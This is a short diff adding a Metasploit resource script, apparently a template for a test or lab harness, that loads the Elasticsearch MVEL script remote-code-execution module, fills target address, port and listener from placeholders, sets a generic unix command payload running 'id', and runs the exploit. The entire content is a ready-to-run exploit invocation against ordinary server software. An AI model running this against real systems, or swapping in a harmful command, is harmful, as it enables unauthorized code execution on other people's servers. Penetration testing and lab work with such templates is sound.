@@ -1,0 +1,7 @@
+use exploit/multi/elasticsearch/script_mvel_rce
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set LHOST %%LHOST%%
+set PAYLOAD cmd/unix/generic
+set CMD id
+run
